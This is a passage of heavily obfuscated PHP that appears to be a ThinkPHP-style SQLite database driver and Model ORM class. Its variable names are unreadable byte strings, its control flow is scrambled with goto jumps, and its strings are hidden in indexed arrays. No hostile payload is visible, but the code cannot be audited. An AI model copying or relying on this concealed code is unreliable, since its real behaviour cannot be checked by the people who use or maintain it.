think_action_status($AŒÜºš±ö[29], 1); goto c²šòßÜõ±; a‹ÑôíÊä: $AŒÜºš±ö =& $_SERVER[œÕÊİğö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A¦–•¾•¶; c²šòßÜõ±: think_status($AŒÜºš±ö[30]); $this->queryID = $this->_linkID->query($eè†‘Õ†œÜ); $this->debug(); goto CæØ—ïíó±; D©Õ’–Æ: } public function execute($AĞ£ªŞç…) { goto c°×£”Ÿ„ƒ; c°×£”Ÿ„ƒ: $cÁĞ¿õ =& $_SERVER[œÕÊİğö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b˜ì±¥‹ ; Fƒà—í¤Ø: think_status($cÁĞ¿õ[30]); $fÆ˜©†·¼ = $this->_linkID->exec($AĞ£ªŞç…); $this->debug(); goto AÉ²ÑÀÙ·†; b˜ì±¥‹ : $this->queryStr = $AĞ£ªŞç…; if ($this->queryID) { $this->free(); } think_action_status($cÁĞ¿õ[31], 1); goto Fƒà—í¤Ø; AÉ²ÑÀÙ·†: if (!1 === $fÆ˜©†·¼) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto càñùÅÊàó; càñùÅÊàó: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[œÕÊİğö][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f«ÀÈ‚’à˜ = $this->_linkID->query($_SERVER[œÕÊİğö][33]); if (!$f«ÀÈ‚’à˜) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fõ÷÷Ïƒå = $this->_linkID->query($_SERVER[œÕÊİğö][34]); if (!$fõ÷÷Ïƒå) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D‹´Ôùº– = array(); while ($A¤‡ ‹±‰Ç = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $D‹´Ôùº–[] = $A¤‡ ‹±‰Ç; } $this->queryID->reset(); return $D‹´Ôùº–; } public function getFields($B¿£ƒ‹²­š) { $DÎ‘ÂáøØó =& $_SERVER[œÕÊİğö]; $f„Îçø÷ğ– = $this->query($DÎ‘ÂáøØó[35] . $B¿£ƒ‹²­š . $DÎ‘ÂáøØó[36]); $c…ñÛÂÍ¼ë = array(); if ($f„Îçø÷ğ–) { foreach ($f„Îçø÷ğ– as $D˜êßÙƒš… => $CˆÔ·òŒ‘) { $c…ñÛÂÍ¼ë[$CˆÔ·òŒ‘[$DÎ‘ÂáøØó[38]]] = array($DÎ‘ÂáøØó[38] => $CˆÔ·òŒ‘[$DÎ‘ÂáøØó[38]], $DÎ‘ÂáøØó[39] => $CˆÔ·òŒ‘[$DÎ‘ÂáøØó[39]], $DÎ‘ÂáøØó[41] => (bool) ($CˆÔ·òŒ‘[$DÎ‘ÂáøØó[41]] === $DÎ‘ÂáøØó[43]), $DÎ‘ÂáøØó[44] => $CˆÔ·òŒ‘[$DÎ‘ÂáøØó[63]], $DÎ‘ÂáøØó[46] => (bool) $CˆÔ·òŒ‘[$DÎ‘ÂáøØó[64]], $DÎ‘ÂáøØó[49] => (bool) $CˆÔ·òŒ‘[$DÎ‘ÂáøØó[64]]); } } return $c…ñÛÂÍ¼ë; } public function getTables($FŠòá£ğçó = '') { $fèÌ‚Åìò´ =& $_SERVER[œÕÊİğö]; $CÀ²¯×Ÿòî = $this->query($fèÌ‚Åìò´[52] . $fèÌ‚Åìò´[53] . $fèÌ‚Åìò´[54]); $AŒ«¬¥˜™Ä = array(); foreach ($CÀ²¯×Ÿòî as $fÒ ŠÙĞÚŒ => $C‰Ñ°¬¢àÚ) { $AŒ«¬¥˜™Ä[$fÒ ŠÙĞÚŒ] = current($C‰Ñ°¬¢àÚ); } return $AŒ«¬¥˜™Ä; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Bê¡ÔŒ„»› =& $_SERVER[œÕÊİğö]; $this->error = $this->_linkID->lastErrorMsg(); if ($Bê¡ÔŒ„»›[43] != $this->queryStr) { $this->error .= LNG($Bê¡ÔŒ„»›[55]) . $this->queryStr; } think_trace($this->error, $Bê¡ÔŒ„»›[43], $Bê¡ÔŒ„»›[56]); return $this->error; } public function escapeString($AÍ¢²Å¾‰™) { $Cá•ˆø½­ë =& $_SERVER[œÕÊİğö]; if ($this->_linkID) { return $this->_linkID->escapeString($AÍ¢²Å¾‰™); } return str_ireplace($Cá•ˆø½­ë[65], $Cá•ˆø½­ë[66], $AÍ¢²Å¾‰™); } public function parseLimit($e“â ŞŒ¢’) { $a´ÉŠ§ÙÁ¬ =& $_SERVER[œÕÊİğö]; $c‹ë—µ«§ƒ = $a´ÉŠ§ÙÁ¬[43]; if (!empty($e“â ŞŒ¢’)) { $e“â ŞŒ¢’ = explode($a´ÉŠ§ÙÁ¬[57], $e“â ŞŒ¢’); if (count($e“â ŞŒ¢’) > 1) { $c‹ë—µ«§ƒ .= $a´ÉŠ§ÙÁ¬[58] . $e“â ŞŒ¢’[1] . $a´ÉŠ§ÙÁ¬[59] . $e“â ŞŒ¢’[0] . $a´ÉŠ§ÙÁ¬[60]; } else { $c‹ë—µ«§ƒ .= $a´ÉŠ§ÙÁ¬[58] . $e“â ŞŒ¢’[0] . $a´ÉŠ§ÙÁ¬[60]; } } return $c‹ë—µ«§ƒ; } } goto eÌàˆ±…¾…; f­‘°óÚÂƒ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\157\162\x64\x65\162", "\141\x6c\x69\x61\163", "\150\141\x76\x69\x6e\x67", "\x67\x72\157\165\160", "\154\157\x63\153", "\144\151\x73\x74\151\156\143\164", "\141\165\x74\x6f", "\x66\x69\154\x74\145\x72", "\166\141\x6c\151\144\x61\164\145", "\162\145\163\165\x6c\164", "\x62\x69\x6e\144", "\x74\x6f\x6b\x65\156"); public function __construct($cÊ¶šÑ¶Ù = '', $d¢Ó•ŒÊ¯Œ = '', $Eğ¾…²õÈÄ = '') { $B Š†¤äõë =& $_SERVER[œÕÊİğö]; $this->_initialize(); if (!empty($cÊ¶šÑ¶Ù)) { if (strpos($cÊ¶šÑ¶Ù, $B Š†¤äõë[105])) { list($this->dbName, $this->name) = explode($B Š†¤äõë[105], $cÊ¶šÑ¶Ù); } else { $this->name = $cÊ¶šÑ¶Ù; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($d¢Ó•ŒÊ¯Œ)) { $this->tablePrefix = $B Š†¤äõë[43]; } elseif ($B Š†¤äõë[43] != $d¢Ó•ŒÊ¯Œ) { $this->tablePrefix = $d¢Ó•ŒÊ¯Œ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($B Š†¤äõë[252]); } $this->db(0, empty($this->connection) ? $Eğ¾…²õÈÄ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $e‰¶ßä³µğ =& $_SERVER[œÕÊİğö]; if (empty($this->fields)) { if (think_config($e‰¶ßä³µğ[253])) { $B™á´»Èïñ = $this->dbName ? $this->dbName : think_config($e‰¶ßä³µğ[254]); $D¸ìù‹Æ = think_var_cache($e‰¶ßä³µğ[255] . strtolower(get_path_this($B™á´»Èïñ) . $e‰¶ßä³µğ[105] . $this->name)); if ($D¸ìù‹Æ) { $Aù“Æ­‰Š = think_config($e‰¶ßä³µğ[256]); if (empty($Aù“Æ­‰Š) || $D¸ìù‹Æ[$e‰¶ßä³µğ[257]] == $Aù“Æ­‰Š) { $this->fields = $D¸ìù‹Æ; return; } } } $this->flush(); } } public function flush() { goto BğÜÙˆå”‹; cˆ¡¡Ğ¢Ì–: foreach ($D›È¶òšäÛ as $c¾é·Áß‰† => $D¬ğÜ¥) { $B»Å†„¿‹Ñ[$c¾é·Áß‰†] = $D¬ğÜ¥[$EÕÓœ¾Áñ[39]]; if ($D¬ğÜ¥[$EÕÓœ¾Áñ[46]]) { $this->fields[$EÕÓœ¾Áñ[259]] = $c¾é·Áß‰†; if ($D¬ğÜ¥[$EÕÓœ¾Áñ[49]]) { $this->fields[$EÕÓœ¾Áñ[258]] = !0; } } } $this->fields[$EÕÓœ¾Áñ[260]] = $B»Å†„¿‹Ñ; if (think_config($EÕÓœ¾Áñ[256])) { $this->fields[$EÕÓœ¾Áñ[257]] = think_config($EÕÓœ¾Áñ[256]); } goto C»Î´˜òßØ; e‘¶³±Şµ: if (!$D›È¶òšäÛ) { return !1; } $this->fields = array_keys($D›È¶òšäÛ); $this->fields[$EÕÓœ¾Áñ[258]] = !1; goto cˆ¡¡Ğ¢Ì–; BğÜÙˆå”‹: $EÕÓœ¾Áñ =& $_SERVER[œÕÊİğö]; $this->db->setModel($this->name); $D›È¶òšäÛ = $this->db->getFields($this->getTableName()); goto e‘¶³±Şµ; C»Î´˜òßØ: if (think_config($EÕÓœ¾Áñ[253])) { $D›è—Œ¾³ = $this->dbName ? $this->dbName : think_config($EÕÓœ¾Áñ[254]); think_var_cache($EÕÓœ¾Áñ[255] . strtolower(get_path_this($D›è—Œ¾³) . $EÕÓœ¾Áñ[105] . $this->name), $this->fields); } goto Fª÷„Ç¿ Ú; Fª÷„Ç¿ Ú: } public function switchModel($f…°í“‡É, $BÂÃÕ—‡Ú¤ = array()) { $EÄ·›Øë¦ì =& $_SERVER[œÕÊİğö]; $fÙäïíâÉİ = ucwords(strtolower($f…°í“‡É)) . $EÄ·›Øë¦ì[261]; if (!class_exists($fÙäïíâÉİ)) { think_exception($fÙäïíâÉİ . think_lang($EÄ·›Øë¦ì[262])); } $this->_extModel = new $fÙäïíâÉİ($this->name); if (!empty($BÂÃÕ—‡Ú¤)) { foreach ($BÂÃÕ—‡Ú¤ as $eÍÂâÙ­êÌ) { $this->_extModel->setProperty($eÍÂâÙ­êÌ, $this->{$eÍÂâÙ­êÌ}); } } return $this->_extModel; } public function __set($cĞˆÃëæÑÃ, $eÌÖìŸ–ß·) { $this->data[$cĞˆÃëæÑÃ] = $eÌÖìŸ–ß·; } public function __get($D‰ ©–àª) { return isset($this->data[$D‰ ©–àª]) ? $this->data[$D‰ ©–àª] : null; } public function __isset($dˆÖÉ¹¯´á) { return isset($this->data[$dˆÖÉ¹¯´á]); } public function __unset($CóÏ«Îˆ±¤) { unset($this->data[$CóÏ«Îˆ±¤]); } public function __call($BÁïĞ±†Áô, $e„»ÑÙÀÖ) { $D‘«ÍŒª¿Ê =& $_SERVER[œÕÊİğö]; if (in_array(strtolower($BÁïĞ±†Áô), $this->methods, !0)) { $this->options[strtolower($BÁïĞ±†Áô)] = $e„»ÑÙÀÖ[0]; return $this; } elseif (in_array(strtolower($BÁïĞ±†Áô), array($D‘«ÍŒª¿Ê[263], $D‘«ÍŒª¿Ê[264], $D‘«ÍŒª¿Ê[265], $D‘«ÍŒª¿Ê[266], $D‘«ÍŒª¿Ê[267]), !0)) { $Dãö÷¬Í = isset($e„»ÑÙÀÖ[0]) ? $e„»ÑÙÀÖ[0] : $D‘«ÍŒª¿Ê[192]; $Dãö÷¬Í = $this->db->parseKey($Dãö÷¬Í); return $this->getField(strtoupper($BÁïĞ±†Áô) . $D‘«ÍŒª¿Ê[268] . $Dãö÷¬Í . $D‘«ÍŒª¿Ê[269] . $BÁïĞ±†Áô, $D‘«ÍŒª¿Ê[263]); } elseif (strtolower(substr($BÁïĞ±†Áô, 0, 5)) == $D‘«ÍŒª¿Ê[270]) { $Dãö÷¬Í = think_parse_name(substr($BÁïĞ±†Áô, 5)); $c£ğÙ°•£[$Dãö÷¬Í] = $e„»ÑÙÀÖ[0]; return $this->where($c£ğÙ°•£)->find(); } elseif (strtolower(substr($BÁïĞ±†Áô, 0, 10)) == $D‘«ÍŒª¿Ê[271]) { $b ÁÖš§èà = think_parse_name(substr($BÁïĞ±†Áô, 10)); $c£ğÙ°•£[$b ÁÖš§èà] = $e„»ÑÙÀÖ[0]; return $this->where($c£ğÙ°•£)->getField($e„»ÑÙÀÖ[1]); } elseif (isset($this->_scope[$BÁïĞ±†Áô])) { return $this->scope($BÁïĞ±†Áô, $e„»ÑÙÀÖ[0]); } elseif (method_exists($this, $BÁïĞ±†Áô)) { array_unshift($e„»ÑÙÀÖ, $BÁïĞ±†Áô); return call_user_func_array(array($this, $D‘«ÍŒª¿Ê[272]), $e„»ÑÙÀÖ); } else { return call_user_func_array(array(parent, $BÁïĞ±†Áô), $e„»ÑÙÀÖ); } } protected function call() { goto F¯¤Ò®‹•à; BÀƒ©¥‘‘: $Dß…¨‚¿Óê = $FÃ³áÛµÅ¤; if (is_array($FÃ³áÛµÅ¤)) { $Dß…¨‚¿Óê = $FÃ³áÛµÅ¤[1]; $FÃ³áÛµÅ¤ = $FÃ³áÛµÅ¤[0]; } $A¶…ªê‰‰ = count($B¯‘©øÇµ) - 1; goto AÎéíØù˜; AÎéíØù˜: if (isset($B¯‘©øÇµ[$A¶…ªê‰‰]) && $B¯‘©øÇµ[$A¶…ªê‰‰] === $FÃ³áÛµÅ¤) { think_exception(__CLASS__ . $bùµµÖ‚’[4] . $FÃ³áÛµÅ¤ . think_lang($bùµµÖ‚’[273])); return; } $B¯‘©øÇµ[] = $FÃ³áÛµÅ¤; if (method_exists($this, $bùµµÖ‚’[274])) { $dÎÍåÑÛ = call_user_func_array(array($this, $bùµµÖ‚’[275]), array($Dß…¨‚¿Óê, $B¯‘©øÇµ)); if (!is_null($dÎÍåÑÛ) && $dÎÍåÑÛ !== !1) { return $dÎÍåÑÛ; } } goto Fâã®­ÌŸ; Fâã®­ÌŸ: $d÷Ò‹×Ùö• = call_user_func_array(array($this, $FÃ³áÛµÅ¤), $B¯‘©øÇµ); if (method_exists($this, $bùµµÖ‚’[276])) { $dÎÍåÑÛ = call_user_func_array(array($this, $bùµµÖ‚’[277]), array($Dß…¨‚¿Óê, $B¯‘©øÇµ, $d÷Ò‹×Ùö•)); if ($dÎÍåÑÛ) { return $dÎÍåÑÛ; } } return $d÷Ò‹×Ùö•; goto DĞ¦Ğ¼¬·”; F¯¤Ò®‹•à: $bùµµÖ‚’ =& $_SERVER[œÕÊİğö]; $B¯‘©øÇµ = func_get_args(); $FÃ³áÛµÅ¤ = array_shift($B¯‘©øÇµ); goto BÀƒ©¥‘‘; DĞ¦Ğ¼¬·”: } protected function _initialize() { } protected function _facade($bÇ§££ŠÉ“) { $Dêƒ¥Ó°Šá =& $_SERVER[œÕÊİğö]; if (!empty($this->fields)) { foreach ($bÇ§££ŠÉ“ as $C×”ƒ•÷Ó‰ => $fÕæ®ã¯‰˜) { if (is_array($this->fields) && !in_array($C×”ƒ•÷Ó‰, $this->fields, !0)) { unset($bÇ§££ŠÉ“[$C×”ƒ•÷Ó‰]); } elseif (is_scalar($fÕæ®ã¯‰˜)) { $this->_parseType($bÇ§££ŠÉ“, $C×”ƒ•÷Ó‰); } } } if (!empty($this->options[$Dêƒ¥Ó°Šá[278]])) { $bÇ§££ŠÉ“ = array_map($this->options[$Dêƒ¥Ó°Šá[278]], $bÇ§££ŠÉ“); unset($this->options[$Dêƒ¥Ó°Šá[278]]); } $this->_beforeWrite($bÇ§££ŠÉ“); return $bÇ§££ŠÉ“; } protected function _beforeWrite(&$dÏãÊÕ ÙË) { } public function add($b¾„§¨™» = '', $cØï‡›½âÏ = array(), $cÆÓù÷‡ã· = false) { goto Båƒğ‘›Ö›; fäâ«Û “: if (!1 === $this->_beforeInsert($b¾„§¨™», $cØï‡›½âÏ)) { return !1; } $bñÀ§²§‡ = $this->db->insert($b¾„§¨™», $cØï‡›½âÏ, $cÆÓù÷‡ã·); if (!1 !== $bñÀ§²§‡) { $C¶Ÿá¤œÑ° = $this->getLastInsID(); if ($C¶Ÿá¤œÑ°) { $b¾„§¨™»[$this->getPk()] = $C¶Ÿá¤œÑ°; $this->_after_insert($b¾„§¨™», $cØï‡›½âÏ); return $C¶Ÿá¤œÑ°; } $this->_after_insert($b¾„§¨™», $cØï‡›½âÏ); } goto C’óÇœ‰Äå; Båƒğ‘›Ö›: if (empty($b¾„§¨™»)) { if (!empty($this->data)) { $b¾„§¨™» = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[œÕÊİğö][279]); return !1; } } $cØï‡›½âÏ = $this->_parseOptions($cØï‡›½âÏ); $b¾„§¨™» = $this->_facade($b¾„§¨™»); goto fäâ«Û “; C’óÇœ‰Äå: return $bñÀ§²§‡; goto d²àŠÄ“ÏÚ; d²àŠÄ“ÏÚ: } protected function _beforeInsert(&$CÑïÁÍìâ°, $c¯ØàØÎí) { } protected function _after_insert($f‰š„ÁœÙ©, $BŒ¼Ì³Ú) { } public function addAll($cŠÒ”¢’, $DĞ¹Í‰‘ˆµ = array(), $CÀ¬õ¹İá´ = false) { goto Fó¡ÕÄåª¡; d¤ƒß®ïà•: foreach ($cŠÒ”¢’ as $c–İ©È¼… => $cà­ù¬ì¥) { $cŠÒ”¢’[$c–İ©È¼…] = $this->_facade($cà­ù¬ì¥); } if (method_exists($this->db, $aÆš§¶†÷´[280])) { $BÈ…çÍ©ñÜ = $this->db->insertAll($cŠÒ”¢’, $DĞ¹Í‰‘ˆµ, $CÀ¬õ¹İá´); } else { $this->startTrans(); foreach ($cŠÒ”¢’ as $c–İ©È¼… => $cà­ù¬ì¥) { $BÈ…çÍ©ñÜ = $this->db->insert($cà­ù¬ì¥, $DĞ¹Í‰‘ˆµ, $CÀ¬õ¹İá´); } $this->commit(); } if (!1 !== $BÈ…çÍ©ñÜ) { $b‹™òàÕÈš = $this->getLastInsID(); if ($b‹™òàÕÈš) { return $b‹™òàÕÈš; } } goto bÊ®ÆÒ¥•ª; bÊ®ÆÒ¥•ª: return $BÈ…çÍ©ñÜ; goto b†ÊÁø”Şñ; Fó¡ÕÄåª¡: $aÆš§¶†÷´ =& $_SERVER[œÕÊİğö]; if (empty($cŠÒ”¢’)) { $this->error = think_lang($aÆš§¶†÷´[279]); return !1; } $DĞ¹Í‰‘ˆµ = $this->_parseOptions($DĞ¹Í‰‘ˆµ); goto d¤ƒß®ïà•; b†ÊÁø”Şñ: } public function selectAdd($c—‘¤Èù„ = '', $f‰†£Ëãœˆ = '', $AÛğæßÀ¬‹ = array()) { $bôĞÅ´³¹ó =& $_SERVER[œÕÊİğö]; $AÛğæßÀ¬‹ = $this->_parseOptions($AÛğæßÀ¬‹); if (!1 === ($a‚Ğä‚… = $this->db->selectInsert($c—‘¤Èù„ ? $c—‘¤Èù„ : $AÛğæßÀ¬‹[$bôĞÅ´³¹ó[281]], $f‰†£Ëãœˆ ? $f‰†£Ëãœˆ : $this->getTableName(), $AÛğæßÀ¬‹))) { $this->error = think_lang($bôĞÅ´³¹ó[282]); return !1; } else { return $a‚Ğä‚…; } } public function save($Eäó´…öÑ¢ = '', $cÑ«Å¬Î‡ø = array()) { goto c‰î°¦Ğñ; B÷Û¦à…É: if (is_array($cÑ«Å¬Î‡ø[$aö¢ÏäÇŠš[283]]) && isset($cÑ«Å¬Î‡ø[$aö¢ÏäÇŠš[283]][$c“ˆÚÜÜ§®])) { $bˆšÈªÎİŒ = $cÑ«Å¬Î‡ø[$aö¢ÏäÇŠš[283]][$c“ˆÚÜÜ§®]; } if (!1 === $this->_beforeUpdate($Eäó´…öÑ¢, $cÑ«Å¬Î‡ø)) { return !1; } $AÆŒ±â—ù¤ = $this->db->update($Eäó´…öÑ¢, $cÑ«Å¬Î‡ø); goto A’°¦ó†­Œ; A’°¦ó†­Œ: if (!1 !== $AÆŒ±â—ù¤) { if (isset($bˆšÈªÎİŒ)) { $Eäó´…öÑ¢[$c“ˆÚÜÜ§®] = $bˆšÈªÎİŒ; } $this->_afterUpdate($Eäó´…öÑ¢, $cÑ«Å¬Î‡ø); } return $AÆŒ±â—ù¤; goto EÙ½ŸëïôÂ; D£¦ÕÊÇÃÓ: $cÑ«Å¬Î‡ø = $this->_parseOptions($cÑ«Å¬Î‡ø); $c“ˆÚÜÜ§® = $this->getPk(); if (!isset($cÑ«Å¬Î‡ø[$aö¢ÏäÇŠš[283]])) { if (isset($Eäó´…öÑ¢[$c“ˆÚÜÜ§®])) { $aˆ¹á¨ìŒ¹[$c“ˆÚÜÜ§®] = $Eäó´…öÑ¢[$c“ˆÚÜÜ§®]; $cÑ«Å¬Î‡ø[$aö¢ÏäÇŠš[283]] = $aˆ¹á¨ìŒ¹; unset($Eäó´…öÑ¢[$c“ˆÚÜÜ§®]); } else { $this->error = think_lang($aö¢ÏäÇŠš[282]); return !1; } } goto B÷Û¦à…É; c‰î°¦Ğñ: $aö¢ÏäÇŠš =& $_SERVER[œÕÊİğö]; if (empty($Eäó´…öÑ¢)) { if (!empty($this->data)) { $Eäó´…öÑ¢ = $this->data; $this->data = array(); } else { $this->error = think_lang($aö¢ÏäÇŠš[279]); return !1; } } $Eäó´…öÑ¢ = $this->_facade($Eäó´…öÑ¢); goto D£¦ÕÊÇÃÓ; EÙ½ŸëïôÂ: } protected function _beforeUpdate(&$bàÖøÅ¢³˜, $FŞ÷‹£™Ä°) { } protected function _afterUpdate($E£ºƒë„‡‡, $cç°ªŸ÷«Ò) { } public function delete($DÇ±Ä°ªè¼ = array()) { goto AÓ˜Ï®ù®ö; AÓ˜Ï®ù®ö: $F·øŸ§Ğ°´ =& $_SERVER[œÕÊİğö]; if (empty($DÇ±Ä°ªè¼) && empty($this->options[$F·øŸ§Ğ°´[283]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $bÓÀ’Ûòâî = $this->getPk(); goto cƒÂ„‚‚”‰; eÊì˜çîÍŠ: $bŠÆÇ¤£ÛÜ = $this->db->delete($DÇ±Ä°ªè¼); if (!1 !== $bŠÆÇ¤£ÛÜ) { $eÒ¼¢¨ã§® = array(); if (isset($B‡†Ùäá¸Û)) { $eÒ¼¢¨ã§®[$bÓÀ’Ûòâî] = $B‡†Ùäá¸Û; } $this->_after_delete($eÒ¼¢¨ã§®, $DÇ±Ä°ªè¼); } return $bŠÆÇ¤£ÛÜ; goto f¹Êàöê¾Ñ; cƒÂ„‚‚”‰: if (is_numeric($DÇ±Ä°ªè¼) || is_string($DÇ±Ä°ªè¼)) { if (strpos($DÇ±Ä°ªè¼, $F·øŸ§Ğ°´[57])) { $E„½Åâã¶[$bÓÀ’Ûòâî] = array($F·øŸ§Ğ°´[284], $DÇ±Ä°ªè¼); } else { $E„½Åâã¶[$bÓÀ’Ûòâî] = $DÇ±Ä°ªè¼; } $this->options[$F·øŸ§Ğ°´[283]] = $E„½Åâã¶; } $DÇ±Ä°ªè¼ = $this->_parseOptions(); if (is_array($DÇ±Ä°ªè¼[$F·øŸ§Ğ°´[283]]) && isset($DÇ±Ä°ªè¼[$F·øŸ§Ğ°´[283]][$bÓÀ’Ûòâî])) { $B‡†Ùäá¸Û = $DÇ±Ä°ªè¼[$F·øŸ§Ğ°´[283]][$bÓÀ’Ûòâî]; } goto eÊì˜çîÍŠ; f¹Êàöê¾Ñ: } protected function _after_delete($eÑ±˜ÜŠš, $D¿”Ôğ¿Š) { } public function select($Eœì¤š¹ = array()) { goto cì®ƒÖ˜ã; cì®ƒÖ˜ã: $c’¤š‡çĞ× =& $_SERVER[œÕÊİğö]; if (is_string($Eœì¤š¹) || is_numeric($Eœì¤š¹)) { $eƒê†öˆÑÃ = $this->getPk(); if (strpos($Eœì¤š¹, $c’¤š‡çĞ×[57])) { $fí°Çï¢†[$eƒê†öˆÑÃ] = array($c’¤š‡çĞ×[284], $Eœì¤š¹); } else { $fí°Çï¢†[$eƒê†öˆÑÃ] = $Eœì¤š¹; } $this->options[$c’¤š‡çĞ×[283]] = $fí°Çï¢†; } elseif (!1 === $Eœì¤š¹) { $Eœì¤š¹ = $this->_parseOptions(); return $c’¤š‡çĞ×[285] . $this->db->buildSelectSql($Eœì¤š¹) . $c’¤š‡çĞ×[286]; } $Eœì¤š¹ = $this->_parseOptions(); goto CÂ›ÈùĞë; BÖƒõ²Éâê: $this->_afterSelect($e÷İÅ«³…, $Eœì¤š¹); return $e÷İÅ«³…; goto d¯¨ß¦ÂËª; CÂ›ÈùĞë: $e÷İÅ«³… = $this->db->select($Eœì¤š¹); if (!1 === $e÷İÅ«³…) { return !1; } if (empty($e÷İÅ«³…)) { return null; } goto BÖƒõ²Éâê; d¯¨ß¦ÂËª: } protected function _afterSelect(&$A½«‡¹¢µ†, $Få‚¾„ôØ¥) { } public function buildSql($c‚˜ùšÖğ = array()) { $e¾—êº‘à­ =& $_SERVER[œÕÊİğö]; $c‚˜ùšÖğ = $this->_parseOptions($c‚˜ùšÖğ); return $e¾—êº‘à­[285] . $this->db->buildSelectSql($c‚˜ùšÖğ) . $e¾—êº‘à­[286]; } public function optionsValue($c™°„å‰¦ = null) { if (is_null($c™°„å‰¦)) { return $this->options; } elseif (is_array($c™°„å‰¦)) { $this->options = array_merge($this->options, $c™°„å‰¦); } } protected function _parseOptions($fÚªƒ± = array()) { goto bÓÔË‡¡¦Ê; bÓÔË‡¡¦Ê: $b„¨Ë¥”ñß =& $_SERVER[œÕÊİğö]; if (is_array($fÚªƒ±)) { $fÚªƒ± = array_merge($this->options, $fÚªƒ±); } $this->options = array(); goto e¥Â¼†éŸô; e¥Â¼†éŸô: if (!isset($fÚªƒ±[$b„¨Ë¥”ñß[287]])) { $fÚªƒ±[$b„¨Ë¥”ñß[287]] = $this->getTableName(); $Dëöªí†ã… = $this->fields; } else { $Dëöªí†ã… = $this->getDbFields(); } if (!empty($fÚªƒ±[$b„¨Ë¥”ñß[288]])) { $fÚªƒ±[$b„¨Ë¥”ñß[287]] .= $b„¨Ë¥”ñß[60] . $fÚªƒ±[$b„¨Ë¥”ñß[288]]; } $fÚªƒ±[$b„¨Ë¥”ñß[289]] = $this->name; goto aå‹˜„Íé©; aå‹˜„Íé©: if (isset($fÚªƒ±[$b„¨Ë¥”ñß[283]]) && is_array($fÚªƒ±[$b„¨Ë¥”ñß[283]]) && !empty($Dëöªí†ã…) && !isset($fÚªƒ±[$b„¨Ë¥”ñß[290]]) && !isset($fÚªƒ±[$b„¨Ë¥”ñß[287]])) { foreach ($fÚªƒ±[$b„¨Ë¥”ñß[283]] as $E«è›Î–Ù => $C¸ˆÆ›éÅ½) { $E«è›Î–Ù = trim($E«è›Î–Ù); if (in_array($E«è›Î–Ù, $Dëöªí†ã…, !0)) { if (is_scalar($C¸ˆÆ›éÅ½)) { $this->_parseType($fÚªƒ±[$b„¨Ë¥”ñß[283]], $E«è›Î–Ù); } } elseif (!is_numeric($E«è›Î–Ù) && $b„¨Ë¥”ñß[81] != substr($E«è›Î–Ù, 0, 1) && !1 === strpos($E«è›Î–Ù, $b„¨Ë¥”ñß[105]) && !1 === strpos($E«è›Î–Ù, $b„¨Ë¥”ñß[268]) && !1 === strpos($E«è›Î–Ù, $b„¨Ë¥”ñß[291]) && !1 === strpos($E«è›Î–Ù, $b„¨Ë¥”ñß[292])) { unset($fÚªƒ±[$b„¨Ë¥”ñß[283]][$E«è›Î–Ù]); } } } $this->_options_filter($fÚªƒ±); return $fÚªƒ±; goto b‘ªùî»ó„; b‘ªùî»ó„: } protected function _options_filter(&$b¾…Ù‰ ÑÙ) { } protected function _parseType(&$F´æšÊÖ®ª, $F¬»¡Ï ‡) { $c²¬ÖÅÄ…” =& $_SERVER[œÕÊİğö]; if (empty($this->options[$c²¬ÖÅÄ…”[293]][$c²¬ÖÅÄ…”[4] . $F¬»¡Ï ‡])) { $eÔº“°’œÌ = strtolower($this->fields[$c²¬ÖÅÄ…”[260]][$F¬»¡Ï ‡]); if (!1 !== strpos($eÔº“°’œÌ, $c²¬ÖÅÄ…”[294])) { } elseif (!1 === strpos($eÔº“°’œÌ, $c²¬ÖÅÄ…”[295]) && !1 !== strpos($eÔº“°’œÌ, $c²¬ÖÅÄ…”[296])) { $F´æšÊÖ®ª[$F¬»¡Ï ‡] = intval($F´æšÊÖ®ª[$F¬»¡Ï ‡]); } elseif (!1 !== strpos($eÔº“°’œÌ, $c²¬ÖÅÄ…”[297]) || !1 !== strpos($eÔº“°’œÌ, $c²¬ÖÅÄ…”[298])) { $F´æšÊÖ®ª[$F¬»¡Ï ‡] = floatval($F´æšÊÖ®ª[$F¬»¡Ï ‡]); } elseif (!1 !== strpos($eÔº“°’œÌ, $c²¬ÖÅÄ…”[299])) { $F´æšÊÖ®ª[$F¬»¡Ï ‡] = (bool) $F´æšÊÖ®ª[$F¬»¡Ï ‡]; } } } public function find($f×«òšĞ‰ = array()) { goto aáÙ¼áÌø£; aáÙ¼áÌø£: $f­ˆéÜÔÒ =& $_SERVER[œÕÊİğö]; if (is_numeric($f×«òšĞ‰) || is_string($f×«òšĞ‰)) { $dİ¶Óè‹¯ö[$this->getPk()] = intval($f×«òšĞ‰); $this->options[$f­ˆéÜÔÒ[283]] = $dİ¶Óè‹¯ö; } $this->options[$f­ˆéÜÔÒ[300]] = 1; goto AË†‘¬ğ‡É; dÏ´çéæ¢Ô: if (!empty($this->options[$f­ˆéÜÔÒ[301]])) { return $this->returnResult($this->data, $this->options[$f­ˆéÜÔÒ[301]]); } return $this->data; goto eˆê¬êêØÌ; AË†‘¬ğ‡É: $f×«òšĞ‰ = $this->_parseOptions(); $dØ±ĞÇ‘à = 